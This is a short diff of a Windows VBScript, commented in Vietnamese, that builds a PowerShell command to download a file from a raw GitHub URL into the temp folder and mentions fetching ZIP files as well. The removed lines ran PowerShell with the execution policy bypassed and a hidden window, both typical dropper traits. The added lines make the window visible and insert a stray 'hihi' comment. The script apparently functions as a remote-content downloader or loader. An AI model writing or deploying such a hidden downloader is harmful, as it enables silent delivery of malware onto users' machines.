@@ -1,3 +1,4 @@
+'hihi
 Dim http, url1, url2, tempFolder, zip1, zip2
 Dim shell, fso, stream, txtPath, scriptName
 
@@ -15,9 +16,9 @@ txtPath = tempFolder & scriptName & ".txt"
 
 ' Tải file txt từ GitHub
 rawUrl = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/content"
-cmd1 = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+cmd1 = "powershell -NoProfile -Command " & _
   """(New-Object Net.WebClient).DownloadFile('" & rawUrl & "','" & txtPath & "')"""
-shell.Run cmd1, 0, True
+shell.Run cmd1, 1, True
 
 
 ' URL của các file ZIP
